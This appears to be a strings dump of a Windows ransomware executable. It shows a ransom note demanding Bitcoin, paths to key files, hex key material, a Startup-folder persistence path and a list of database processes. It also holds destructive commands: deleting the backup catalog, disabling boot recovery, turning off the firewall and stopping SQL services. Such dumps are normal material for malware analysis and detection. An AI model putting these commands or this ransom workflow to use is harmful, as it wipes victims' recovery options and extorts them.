[Strings]
nth   paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0     0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
1     0x00000100 0x00000100 6   7            ascii   RichHW
2     0x00000218 0x00000218 5   6            ascii   .text
3     0x0000023f 0x0000023f 7   8            ascii   `.rdata
4     0x00000267 0x00000267 6   7            ascii   @.data
5     0x00000290 0x00000290 5   6            ascii   .rsrc
6     0x000002b7 0x000002b7 7   8            ascii   @.reloc
14544 0x0011443c 0x0051523c 5   12   .rdata  utf16le hu-hu
14545 0x00114448 0x00515248 5   12   .rdata  utf16le hy-am
14546 0x00114454 0x00515254 5   12   .rdata  utf16le id-id
14547 0x00114460 0x00515260 5   12   .rdata  utf16le is-is
14548 0x0011446c 0x0051526c 5   12   .rdata  utf16le it-ch
14549 0x00114478 0x00515278 5   12   .rdata  utf16le it-it
14550 0x00114484 0x00515284 5   12   .rdata  utf16le ja-jp
14551 0x00114490 0x00515290 5   12   .rdata  utf16le ka-ge
14552 0x0011449c 0x0051529c 5   12   .rdata  utf16le kk-kz
14553 0x001144a8 0x005152a8 5   12   .rdata  utf16le kn-in
14554 0x001144b4 0x005152b4 6   14   .rdata  utf16le kok-in
14555 0x001144c4 0x005152c4 5   12   .rdata  utf16le ko-kr
14556 0x001144d0 0x005152d0 5   12   .rdata  utf16le ky-kg
14557 0x001144dc 0x005152dc 5   12   .rdata  utf16le lt-lt
14558 0x001144e8 0x005152e8 5   12   .rdata  utf16le lv-lv
14559 0x001144f4 0x005152f4 5   12   .rdata  utf16le mi-nz
14560 0x00114500 0x00515300 5   12   .rdata  utf16le mk-mk
14561 0x0011450c 0x0051530c 5   12   .rdata  utf16le ml-in
14562 0x00114518 0x00515318 5   12   .rdata  utf16le mn-mn
14563 0x00114524 0x00515324 5   12   .rdata  utf16le mr-in
14564 0x00114530 0x00515330 5   12   .rdata  utf16le ms-bn
14565 0x0011453c 0x0051533c 5   12   .rdata  utf16le ms-my
14566 0x00114548 0x00515348 5   12   .rdata  utf16le mt-mt
14567 0x00114554 0x00515354 5   12   .rdata  utf16le nb-no
14568 0x00114560 0x00515360 5   12   .rdata  utf16le nl-be
14569 0x0011456c 0x0051536c 5   12   .rdata  utf16le nl-nl
14570 0x00114578 0x00515378 5   12   .rdata  utf16le nn-no
14571 0x00114584 0x00515384 5   12   .rdata  utf16le ns-za
14572 0x00114590 0x00515390 5   12   .rdata  utf16le pa-in
14573 0x0011459c 0x0051539c 5   12   .rdata  utf16le pl-pl
14574 0x001145a8 0x005153a8 5   12   .rdata  utf16le pt-br
14575 0x001145b4 0x005153b4 5   12   .rdata  utf16le pt-pt
14576 0x001145c0 0x005153c0 6   14   .rdata  utf16le quz-bo
14577 0x001145d0 0x005153d0 6   14   .rdata  utf16le quz-ec
14578 0x001145e0 0x005153e0 6   14   .rdata  utf16le quz-pe
14579 0x001145f0 0x005153f0 5   12   .rdata  utf16le ro-ro
14580 0x001145fc 0x005153fc 5   12   .rdata  utf16le ru-ru
14581 0x00114608 0x00515408 5   12   .rdata  utf16le sa-in
14582 0x00114614 0x00515414 5   12   .rdata  utf16le se-fi
14583 0x00114620 0x00515420 5   12   .rdata  utf16le se-no
14584 0x0011462c 0x0051542c 5   12   .rdata  utf16le se-se
14585 0x00114638 0x00515438 5   12   .rdata  utf16le sk-sk
14586 0x00114644 0x00515444 5   12   .rdata  utf16le sl-si
14587 0x00114650 0x00515450 6   14   .rdata  utf16le sma-no
14588 0x00114660 0x00515460 6   14   .rdata  utf16le sma-se
14589 0x00114670 0x00515470 6   14   .rdata  utf16le smj-no
14590 0x00114680 0x00515480 6   14   .rdata  utf16le smj-se
14591 0x00114690 0x00515490 6   14   .rdata  utf16le smn-fi
14592 0x001146a0 0x005154a0 6   14   .rdata  utf16le sms-fi
14593 0x001146b0 0x005154b0 5   12   .rdata  utf16le sq-al
14594 0x001146bc 0x005154bc 10  22   .rdata  utf16le sr-ba-cyrl
14595 0x001146d4 0x005154d4 10  22   .rdata  utf16le sr-ba-latn
14596 0x001146ec 0x005154ec 10  22   .rdata  utf16le sr-sp-cyrl
14597 0x00114704 0x00515504 10  22   .rdata  utf16le sr-sp-latn
14598 0x0011471c 0x0051551c 5   12   .rdata  utf16le sv-fi
14599 0x00114728 0x00515528 5   12   .rdata  utf16le sv-se
14600 0x00114734 0x00515534 5   12   .rdata  utf16le sw-ke
14601 0x00114740 0x00515540 6   14   .rdata  utf16le syr-sy
14602 0x00114750 0x00515550 5   12   .rdata  utf16le ta-in
14603 0x0011475c 0x0051555c 5   12   .rdata  utf16le te-in
14604 0x00114768 0x00515568 5   12   .rdata  utf16le th-th
14605 0x00114774 0x00515574 5   12   .rdata  utf16le tn-za
14606 0x00114780 0x00515580 5   12   .rdata  utf16le tr-tr
14607 0x0011478c 0x0051558c 5   12   .rdata  utf16le tt-ru
14608 0x00114798 0x00515598 5   12   .rdata  utf16le uk-ua
14609 0x001147a4 0x005155a4 5   12   .rdata  utf16le ur-pk
14610 0x001147b0 0x005155b0 10  22   .rdata  utf16le uz-uz-cyrl
14611 0x001147c8 0x005155c8 10  22   .rdata  utf16le uz-uz-latn
14612 0x001147e0 0x005155e0 5   12   .rdata  utf16le vi-vn
14613 0x001147ec 0x005155ec 5   12   .rdata  utf16le xh-za
14614 0x001147f8 0x005155f8 6   14   .rdata  utf16le zh-chs
14615 0x00114808 0x00515608 6   14   .rdata  utf16le zh-cht
14616 0x00114818 0x00515618 5   12   .rdata  utf16le zh-cn
14617 0x00114824 0x00515624 5   12   .rdata  utf16le zh-hk
14618 0x00114830 0x00515630 5   12   .rdata  utf16le zh-mo
14619 0x0011483c 0x0051563c 5   12   .rdata  utf16le zh-sg
14620 0x00114848 0x00515648 5   12   .rdata  utf16le zh-tw
14621 0x00114854 0x00515654 5   12   .rdata  utf16le zu-za
14622 0x00114864 0x00515664 5   6    .rdata  ascii   1#INF
14623 0x0011486c 0x0051566c 6   7    .rdata  ascii   1#QNAN
14624 0x00114874 0x00515674 6   7    .rdata  ascii   1#SNAN
14625 0x0011487c 0x0051567c 5   6    .rdata  ascii   1#IND
14626 0x001148c7 0x005156c7 5   7    .rdata  utf8    ?0gǓW blocks=Basic Latin,Latin Extended-B
14627 0x00114959 0x00515759 5   6    .rdata  ascii   UUUUU
14628 0x00114970 0x00515770 7   16   .rdata  utf16le CONOUT$
14629 0x001149a2 0x005157a2 6   8    .rdata  utf8    g5RҌ<t blocks=Basic Latin,Cyrillic
14630 0x001149b6 0x005157b6 4   6    .rdata  utf8    `<țu blocks=Basic Latin,Latin Extended-B
14631 0x001149d0 0x005157d0 4   6    .rdata  utf8    ќ/p= blocks=Cyrillic,Basic Latin
14632 0x001149f3 0x005157f3 4   6    .rdata  utf8    &TŤ< blocks=Basic Latin,Latin Extended-A
14633 0x00114a01 0x00515801 5   6    .rdata  ascii   ?RbSQ
14634 0x00114a07 0x00515807 5   6    .rdata  ascii   <zQ}<
14635 0x00114a20 0x00515820 4   5    .rdata  ascii   _/:>
14636 0x00114a31 0x00515831 4   6    .rdata  utf8    æDAo blocks=Latin-1 Supplement,Basic Latin
14637 0x00114a47 0x00515847 7   8    .rdata  ascii   <8bunz8
14638 0x00114a93 0x00515893 4   6    .rdata  utf8    ]9ݏ< blocks=Basic Latin,Syriac
14639 0x00114aa7 0x005158a7 4   6    .rdata  utf8    <ʩ:7 blocks=Basic Latin,IPA Extensions
14640 0x00114ab3 0x005158b3 4   6    .rdata  utf8    s)ҧ< blocks=Basic Latin,Cyrillic
14641 0x00114ae5 0x005158e5 4   5    .rdata  ascii   cC<-
14642 0x00114aea 0x005158ea 4   5    .rdata  ascii   a`\bN
14643 0x00114b04 0x00515904 6   8    .rdata  utf8    ΐv<'*6 blocks=Greek and Coptic,Basic Latin
14644 0x00114b47 0x00515947 4   5    .rdata  ascii   <)TH
14645 0x00114b77 0x00515977 4   5    .rdata  ascii   <$"U
14646 0x00114bd6 0x005159d6 4   5    .rdata  ascii   e<bN
14647 0x00114c07 0x00515a07 4   6    .rdata  utf8    <۠*B blocks=Basic Latin,Arabic
14648 0x00114c16 0x00515a16 4   5    .rdata  ascii   {<6w
14649 0x00114c2a 0x00515a2a 4   6    .rdata  utf8    Ͱ77\t blocks=Greek and Coptic,Basic Latin
14650 0x00114c37 0x00515a37 4   6    .rdata  utf8    <ONޟ blocks=Basic Latin,Thaana
14651 0x00114c5a 0x00515a5a 5   6    .rdata  ascii   ]{f\f\n
14652 0x00114c67 0x00515a67 4   5    .rdata  ascii   <\%>
14653 0x00114ce3 0x00515ae3 6   7    .rdata  ascii   l,kg<i
14654 0x00114cfa 0x00515afa 5   6    .rdata  ascii   \aJ-\a\r
14655 0x00114d55 0x00515b55 5   7    .rdata  utf8    Î<'Za blocks=Latin-1 Supplement,Basic Latin
14656 0x00114d67 0x00515b67 7   8    .rdata  ascii   <@En[vP
14657 0x00114d80 0x00515b80 5   6    .rdata  ascii   log10
14658 0x00114ed4 0x00515cd4 4   5    .rdata  ascii   lzZ?
14659 0x00114f0c 0x00515d0c 4   5    .rdata  ascii   \tk8=
14660 0x00114f3b 0x00515d3b 5   6    .rdata  ascii   \tQ*\e=
14661 0x00114f4c 0x00515d4c 4   5    .rdata  ascii   b6\b=
14662 0x00114fe3 0x00515de3 4   6    .rdata  utf8    N\vָ? blocks=Basic Latin,Hebrew
14663 0x00114ff7 0x00515df7 6   7    .rdata  ascii   ?5Wg4p
14664 0x00115009 0x00515e09 4   5    .rdata  ascii   Nv$^
14665 0x00115041 0x00515e41 4   6    .rdata  utf8     <śm blocks=Basic Latin,Latin Extended-A
14666 0x00115079 0x00515e79 4   5    .rdata  ascii   w(@\t
14667 0x001150bb 0x00515ebb 5   6    .rdata  ascii   BC .=
14668 0x001150d9 0x00515ed9 4   5    .rdata  ascii   a>-\e
14669 0x001150f2 0x00515ef2 4   5    .rdata  ascii   (lX 
14670 0x001151bc 0x00515fbc 4   5    .rdata  ascii   #{ =
14671 0x001151c1 0x00515fc1 4   5    .rdata  ascii   `~R=
14672 0x001151fc 0x00515ffc 4   5    .rdata  ascii   }s"=
14673 0x00115202 0x00516002 4   5    .rdata  ascii   \tE[\n
14674 0x00115209 0x00516009 5   6    .rdata  ascii   %S#[k
14675 0x00115251 0x00516051 4   6    .rdata  utf8    x¾/@ blocks=Basic Latin,Latin-1 Supplement
14676 0x0011525a 0x0051605a 6   7    .rdata  ascii   "B <1=
14677 0x00115269 0x00516069 4   5    .rdata  ascii   \-!y
14678 0x0011528a 0x0051608a 6   7    .rdata  ascii   \f#.X'=
14679 0x001152bc 0x005160bc 4   5    .rdata  ascii   i9+=
14680 0x00115728 0x00516528 17  18   .rdata  ascii   Unknown exception
14681 0x0011573c 0x0051653c 15  16   .rdata  ascii   bad locale name
14682 0x0011574c 0x0051654c 5   6    .rdata  ascii   false
14683 0x00115754 0x00516554 4   5    .rdata  ascii   true
14684 0x00115760 0x00516560 7   8    .rdata  ascii   generic
14685 0x00115768 0x00516568 8   9    .rdata  ascii   iostream
14686 0x00115774 0x00516574 21  22   .rdata  ascii   iostream stream error
14687 0x0011578c 0x0051658c 6   7    .rdata  ascii   system
14688 0x00115794 0x00516594 13  14   .rdata  ascii   unknown error
14689 0x001157a4 0x005165a4 20  21   .rdata  ascii   ios_base::badbit set
14690 0x001157bc 0x005165bc 21  22   .rdata  ascii   ios_base::failbit set
14691 0x001157d4 0x005165d4 20  21   .rdata  ascii   ios_base::eofbit set
14692 0x001157f0 0x005165f0 23  24   .rdata  ascii   ', trying to retrieve '
14693 0x00115808 0x00516608 11  12   .rdata  ascii   ', stored '
14694 0x00115814 0x00516614 35  36   .rdata  ascii   NameValuePairs: type mismatch for '
14695 0x00115838 0x00516638 31  32   .rdata  ascii   Clone() is not implemented yet.
14696 0x00115858 0x00516658 7   8    .rdata  ascii   unknown
14697 0x00115864 0x00516664 47  48   .rdata  ascii   : this object doesn't support resynchronization
14698 0x00115898 0x00516698 63  64   .rdata  ascii   StreamTransformation: this object doesn't support random access
14699 0x001158d8 0x005166d8 57  58   .rdata  ascii   RandomNumberGenerator: IncorporateEntropy not implemented
14700 0x00115914 0x00516714 53  54   .rdata  ascii   BufferedTransformation: this object is not attachable
14701 0x0011594c 0x0051674c 51  52   .rdata  ascii   CryptoMaterial: this object contains invalid values
14702 0x00115980 0x00516780 59  60   .rdata  ascii   CryptoMaterial: this object does not support precomputation
14703 0x001159c0 0x005167c0 80  81   .rdata  ascii   GeneratableCryptoMaterial: this object does not support key/parameter generation
14704 0x00115a18 0x00516818 10  11   .rdata  ascii   " not used
14705 0x00115a24 0x00516824 36  37   .rdata  ascii   AlgorithmParametersBase: parameter "
14706 0x00115a4c 0x0051684c 11  12   .rdata  ascii   InputBuffer
14707 0x00115a58 0x00516858 5   6    .rdata  ascii   SHA-1
14708 0x00115a60 0x00516860 12  13   .rdata  ascii   FeedbackSize
14709 0x00115a70 0x00516870 13  14   .rdata  ascii   InputFileName
14710 0x00115a80 0x00516880 17  18   .rdata  ascii   InputFileNameWide
14711 0x00115a94 0x00516894 15  16   .rdata  ascii   InputBinaryMode
14712 0x00115aa4 0x005168a4 14  15   .rdata  ascii   OutputFileName
14713 0x00115ab4 0x005168b4 18  19   .rdata  ascii   OutputFileNameWide
14714 0x00115ac8 0x005168c8 16  17   .rdata  ascii   OutputBinaryMode
14715 0x00115adc 0x005168dc 18  19   .rdata  ascii   EncodingParameters
14716 0x00115af0 0x005168f0 8   9    .rdata  ascii   Log2Base
14717 0x00115afc 0x005168fc 19  20   .rdata  ascii   DecodingLookupArray
14718 0x00115b10 0x00516910 16  17   .rdata  ascii   InsertLineBreaks
14719 0x00115b24 0x00516924 13  14   .rdata  ascii   MaxLineLength
14720 0x00115b38 0x00516938 70  71   .rdata  ascii   CipherModeBase: feedback size cannot be specified for this cipher mode
14721 0x00115b8c 0x0051698c 4   5    .rdata  ascii   /GCM
14722 0x00115b94 0x00516994 4   5    .rdata  ascii   MGF1
14723 0x00115bb0 0x005169b0 4   5    .rdata  ascii   ", "
14724 0x00115bbc 0x005169bc 9   10   .rdata  ascii   copy_file
14725 0x00115bc8 0x005169c8 6   7    .rdata  ascii   exists
14726 0x00115bd0 0x005169d0 9   10   .rdata  ascii   file_size
14727 0x00115bdc 0x005169dc 5   6    .rdata  ascii   space
14728 0x00115be4 0x005169e4 6   7    .rdata  ascii   status
14729 0x00115bec 0x005169ec 16  17   .rdata  ascii   create_directory
14730 0x00115c00 0x00516a00 4   5    .rdata  ascii   copy
14731 0x00115c08 0x00516a08 10  22   .rdata  utf16le C:\Windows
14732 0x00115c20 0x00516a20 12  26   .rdata  utf16le C:\\Windows\
14733 0x00115c50 0x00516a50 49  50   .rdata  ascii                                                    
14734 0x00115c88 0x00516a88 26  27   .rdata  ascii   Unhandled exception caught
14735 0x00115cb8 0x00516ab8 4   5    .rdata  ascii   fuck
14736 0x00115cc8 0x00516ac8 6   14   .rdata  utf16le ey.txt
14737 0x00115cd8 0x00516ad8 7   16   .rdata  utf16le IDk.txt
14738 0x00115ce8 0x00516ae8 13  28   .rdata  utf16le Read-this.txt
14739 0x00115d10 0x00516b10 4   10   .rdata  utf16le vkey
14740 0x00115d1c 0x00516b1c 4   10   .rdata  utf16le shit
14741 0x00115d28 0x00516b28 7   8    .rdata  ascii   threaad
14742 0x00115d30 0x00516b30 13  14   .rdata  ascii   sqlserver.exe
14743 0x00115d40 0x00516b40 12  13   .rdata  ascii   msftesql.exe
14744 0x00115d50 0x00516b50 12  13   .rdata  ascii   sqlagent.exe
14745 0x00115d60 0x00516b60 14  15   .rdata  ascii   sqlbrowser.exe
14746 0x00115d70 0x00516b70 13  14   .rdata  ascii   sqlwriter.exe
14747 0x00115d80 0x00516b80 10  11   .rdata  ascii   mysqld.exe
14748 0x00115d8c 0x00516b8c 13  14   .rdata  ascii   mysqld-nt.exe
14749 0x00115d9c 0x00516b9c 14  15   .rdata  ascii   mysqld-opt.exe
14750 0x00115db0 0x00516bb0 14  30   .rdata  utf16le \Read-this.txt
14751 0x00115dd4 0x00516bd4 10  11   .rdata  ascii   0123456789
14752 0x00115de0 0x00516be0 26  27   .rdata  ascii   QWERTYUIOPASDFGHJKLZXCVBNM
14753 0x00115e00 0x00516c00 88  89   .rdata  ascii   0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
14754 0x00115f14 0x00516d14 22  23   .rdata  ascii   C:\ProgramData\IDk.txt
14755 0x00115f2c 0x00516d2c 23  24   .rdata  ascii   C:\ProgramData\pkey.txt
14756 0x00115f44 0x00516d44 14  15   .rdata  ascii   C:\ProgramData
14757 0x00115f58 0x00516d58 30  31   .rdata  ascii   95DE4925807931C8D34E1D9460A2DE
14758 0x00115f78 0x00516d78 912 913  .rdata  ascii   4D2E0F75F1B2499AC0A49EED96F81C9F301AFBE0741530B13E9F0630212DB2DC766CD2D213E1DDE0A7EF8E74182EC3C98ACE5FB67D70AE03053412B2A2E9D09107A0DEFE6748B3100EB8BD2117D6D91AA3A4FC6C98884600F513241A57002F5B2B500831BE3C82967B5AA5652B0B87BCB65963064D61E236FF1B30F3351C9E08759E34BB66A3A81256502169950DF22EB80496AA8E3A3AB84B1D05B0EB4D57F5B16AD80383ECB6B694CBE8843711C87AD13D8DE410F584B9E84139B806C9D968437690B9AD54E41BC2FF71E49180479A77D1CA61456D8E94867BA6C50D3118BBDD4D43E45305276B9F598137EC4188796F75C22578C2F3D4B268C84FC592C28855834D5444AB39CA6F5887C9D731643056E60B008591B37DE5474836A3AD65DE730B8E978B38DD0455007FBCC49969BE20D65B8FE0844EC7294B794B8C269E19A55F024D903D2E25929C66F3AEA56C9BE5D328BF2491027A634F68252D52F57813780B5C5CC89E9222318CC528DDAC9BDF5A95032CD047D6C33726A25DA44955C70D8B3B4EF78A3712A8AA8C1C9139AC703DA00ED2EB99C445836DF610D831D3591447FA252D7AF179CB1002A77BBFEB60F129275873F2EC54C372DF2CF829139DE208884B9DAEE8
14759 0x0011630c 0x0051710c 23  24   .rdata  ascii   https://api.my-ip.io/ip
14760 0x00116324 0x00517124 17  18   .rdata  ascii   %d-%m-%Y %H:%M:%S
14761 0x00116338 0x00517138 25  26   .rdata  ascii   C:\ProgramData\prvkey.txt
14762 0x00116354 0x00517154 6   7    .rdata  ascii    Date:
14763 0x0011635c 0x0051715c 4   5    .rdata  ascii    Ip=
14764 0x00116364 0x00517164 6   7    .rdata  ascii    Mail=
14765 0x0011636c 0x0051716c 11  12   .rdata  ascii     Disksize=
14766 0x00116378 0x00517178 5   6    .rdata  ascii   \n\nID=
14767 0x00116380 0x00517180 29  60   .rdata  utf16le C:\ProgramData\prvkey.txt.key
14768 0x001163c0 0x005171c0 14  15   .rdata  ascii   prvkey.txt.key
14769 0x001163d0 0x005171d0 161 162  .rdata  ascii   fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
14770 0x00116474 0x00517274 20  21   .rdata  ascii   Unhandled exception\n
14771 0x0011648c 0x0051728c 61  62   .rdata  ascii   C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
14772 0x001164d0 0x005172d0 176 177  .rdata  ascii   16346E3C7924457CEAA77D7840E29B5D76FA489C9E4625BF1B89D551CCE746EACEF48299BA30A48DA87A0A756828F5BB14D52EDDA0D3A82698186F2233C4173CFB37E0E9A0FAD6653F72E94B1A27A95BAEFCF13078C387A4
14773 0x00116588 0x00517388 208 209  .rdata  ascii   A010E1CB8C86711D5BD99ACFBFC60480D79592522AC687668CB9FFF15297BF57EE02D9409A4A674BF519A1DA7DA4A30E6C912F37219EE743DF7077E2781C3693D583425E653AAC59D092BB54D00F154EA648BE4449931C1D8F201E703651966E96C447D0B9432E50
14774 0x0011665c 0x0051745c 7   8    .rdata  ascii   .crypyt
14775 0x00116664 0x00517464 14  15   .rdata  ascii   net stop MSDTC
14776 0x00116674 0x00517474 57  58   .rdata  ascii   bcdedit /set {default} bootstatuspolicy ignoreallfailures
14777 0x001166b0 0x005174b0 41  42   .rdata  ascii   bcdedit /set {default} recoveryenabled no
14778 0x001166dc 0x005174dc 29  30   .rdata  ascii   wbadmin delete catalog -quiet
14779 0x001166fc 0x005174fc 23  24   .rdata  ascii   net stop SQLSERVERAGENT
14780 0x00116714 0x00517514 20  21   .rdata  ascii   net stop MSSQLSERVER
14781 0x0011672c 0x0051752c 12  13   .rdata  ascii   net stop vds
14782 0x0011673c 0x0051753c 47  48   .rdata  ascii   netsh advfirewall set  currentprofile state off
14783 0x0011676c 0x0051756c 38  39   .rdata  ascii   netsh firewall set opmode mode=disable
14784 0x00116794 0x00517594 18  19   .rdata  ascii   net stop SQLWriter
14785 0x001167a8 0x005175a8 19  20   .rdata  ascii   net stop SQLBrowser
14786 0x001167bc 0x005175bc 23  24   .rdata  ascii   net stop MSSQL$CONTOSO1
14787 0x001167d4 0x005175d4 23  48   .rdata  utf16le \n\nin Case of no Answer:
14788 0x00116808 0x00517608 418 838  .rdata  utf16le All Your Files Has Been Encrypted\n\nYou Have to Pay to Get Your Files Back\n\n1-Go to C:\ProgramData\ or in Your other Drives   and send us prvkey.txt.key  file  \n\n2-You can send some file little than 1mb for Decryption test to trust us But the test File should not contain valuable data\n\n3-Payment should be with Bitcoin\n\n\n4-Changing Windows without saving prvkey.txt.key file will cause permanete Data loss\n\n\nOur Email:
14789 0x00116b58 0x00517958 19  20   .rdata  ascii   OutputStringPointer
14790 0x00116b6c 0x0051796c 45  46   .rdata  ascii   StringSink: OutputStringPointer not specified
14791 0x00116ba0 0x005179a0 69  70   .rdata  ascii   Unflushable<T>: this object has buffered input that cannot be flushed
14792 0x00116bfc 0x005179fc 55  56   .rdata  ascii   BufferedTransformation: this object doesn't allow input
14793 0x00116c34 0x00517a34 18  19   .rdata  ascii   vector<T> too long
14794 0x00116c64 0x00517a64 58  59   .rdata  ascii   AllocatorBase: requested size would cause integer overflow
14795 0x00116ca0 0x00517aa0 23  24   .rdata  ascii   invalid string position
14796 0x00116cb8 0x00517ab8 15  16   .rdata  ascii   string too long
14797 0x0012076c 0x0052156c 4   5    .rdata  ascii   RSDS
14798 0x00120784 0x00521584 58  59   .rdata  ascii   C:\Users\Legion\source\repos\last project\Release\curl.pdb
14799 0x001207d4 0x005215d4 4   5    .rdata  ascii   GCTL
14800 0x001207e0 0x005215e0 8   9    .rdata  ascii   .text$di
14801 0x001207f4 0x005215f4 8   9    .rdata  ascii   .text$mn
14802 0x00120808 0x00521608 7   8    .rdata  ascii   .text$x
14803 0x00120818 0x00521618 8   9    .rdata  ascii   .text$yd
14804 0x0012082c 0x0052162c 8   9    .rdata  ascii   .idata$5
14805 0x00120840 0x00521640 6   7    .rdata  ascii   .00cfg
14806 0x00120850 0x00521650 8   9    .rdata  ascii   .CRT$XCA
14807 0x00120864 0x00521664 9   10   .rdata  ascii   .CRT$XCAA
14808 0x00120878 0x00521678 8   9    .rdata  ascii   .CRT$XCC
14809 0x0012088c 0x0052168c 8   9    .rdata  ascii   .CRT$XCL
14810 0x001208a0 0x005216a0 8   9    .rdata  ascii   .CRT$XCU
14811 0x001208b4 0x005216b4 8   9    .rdata  ascii   .CRT$XCZ
14812 0x001208c8 0x005216c8 8   9    .rdata  ascii   .CRT$XIA
14813 0x001208dc 0x005216dc 9   10   .rdata  ascii   .CRT$XIAA
14814 0x001208f0 0x005216f0 9   10   .rdata  ascii   .CRT$XIAC
14815 0x00120904 0x00521704 8   9    .rdata  ascii   .CRT$XIC
14816 0x00120918 0x00521718 8   9    .rdata  ascii   .CRT$XIZ
14817 0x0012092c 0x0052172c 8   9    .rdata  ascii   .CRT$XLA
14818 0x00120940 0x00521740 8   9    .rdata  ascii   .CRT$XLZ
14819 0x00120954 0x00521754 8   9    .rdata  ascii   .CRT$XPA
14820 0x00120968 0x00521768 8   9    .rdata  ascii   .CRT$XPB
14821 0x0012097c 0x0052177c 8   9    .rdata  ascii   .CRT$XPX
14822 0x00120990 0x00521790 9   10   .rdata  ascii   .CRT$XPXA
14823 0x001209a4 0x005217a4 8   9    .rdata  ascii   .CRT$XPZ
14824 0x001209b8 0x005217b8 8   9    .rdata  ascii   .CRT$XTA
14825 0x001209cc 0x005217cc 8   9    .rdata  ascii   .CRT$XTZ
14826 0x001209e0 0x005217e0 6   7    .rdata  ascii   .rdata
14827 0x001209f0 0x005217f0 8   9    .rdata  ascii   .rdata$T
14828 0x00120a04 0x00521804 8   9    .rdata  ascii   .rdata$r
14829 0x00120a18 0x00521818 13  14   .rdata  ascii   .rdata$sxdata
14830 0x00120a30 0x00521830 13  14   .rdata  ascii   .rdata$zzzdbg
14831 0x00120a48 0x00521848 8   9    .rdata  ascii   .rtc$IAA
14832 0x00120a5c 0x0052185c 8   9    .rdata  ascii   .rtc$IZZ
14833 0x00120a70 0x00521870 8   9    .rdata  ascii   .rtc$TAA
14834 0x00120a84 0x00521884 8   9    .rdata  ascii   .rtc$TZZ
14835 0x00120a98 0x00521898 4   5    .rdata  ascii   .tls
14836 0x00120aa8 0x005218a8 5   6    .rdata  ascii   .tls$
14837 0x00120ab8 0x005218b8 8   9    .rdata  ascii   .tls$ZZZ
14838 0x00120acc 0x005218cc 8   9    .rdata  ascii   .xdata$x
14839 0x00120ae0 0x005218e0 8   9    .rdata  ascii   .idata$2
14840 0x00120af4 0x005218f4 8   9    .rdata  ascii   .idata$3
14841 0x00120b08 0x00521908 8   9    .rdata  ascii   .idata$4
14842 0x00120b1c 0x0052191c 8   9    .rdata  ascii   .idata$6
14843 0x00120b30 0x00521930 5   6    .rdata  ascii   .data
14844 0x00120b40 0x00521940 7   8    .rdata  ascii   .data$r
14845 0x00120b50 0x00521950 4   5    .rdata  ascii   .bss
14846 0x00120b60 0x00521960 8   9    .rdata  ascii   .rsrc$01
14847 0x00120b74 0x00521974 8   9    .rdata  ascii   .rsrc$02
14848 0x0012b112 0x0052bf12 8   9    .rdata  ascii   WSAIoctl
14849 0x0012b11e 0x0052bf1e 11  12   .rdata  ascii   getaddrinfo
14850 0x0012b12c 0x0052bf2c 12  13   .rdata  ascii   freeaddrinfo
14851 0x0012b13a 0x0052bf3a 10  11   .rdata  ascii   WS2_32.dll
14852 0x0012b148 0x0052bf48 10  11   .rdata  ascii   IdnToAscii
14853 0x0012b154 0x0052bf54 12  13   .rdata  ascii   Normaliz.dll
14854 0x0012b162 0x0052bf62 11  12   .rdata  ascii   WLDAP32.dll
14855 0x0012b170 0x0052bf70 13  14   .rdata  ascii   CertOpenStore
14856 0x0012b180 0x0052bf80 14  15   .rdata  ascii   CertCloseStore
14857 0x0012b192 0x0052bf92 27  28   .rdata  ascii   CertEnumCertificatesInStore
14858 0x0012b1b0 0x0052bfb0 26  27   .rdata  ascii   CertFindCertificateInStore
14859 0x0012b1ce 0x0052bfce 26  27   .rdata  ascii   CertFreeCertificateContext
14860 0x0012b1ec 0x0052bfec 20  21   .rdata  ascii   CryptStringToBinaryA
14861 0x0012b204 0x0052c004 18  19   .rdata  ascii   PFXImportCertStore
14862 0x0012b21a 0x0052c01a 19  20   .rdata  ascii   CryptDecodeObjectEx
14863 0x0012b230 0x0052c030 32  33   .rdata  ascii   CertAddCertificateContextToStore
14864 0x0012b254 0x0052c054 17  18   .rdata  ascii   CertFindExtension
14865 0x0012b268 0x0052c068 18  19   .rdata  ascii   CertGetNameStringA
14866 0x0012b27e 0x0052c07e 16  17   .rdata  ascii   CryptQueryObject
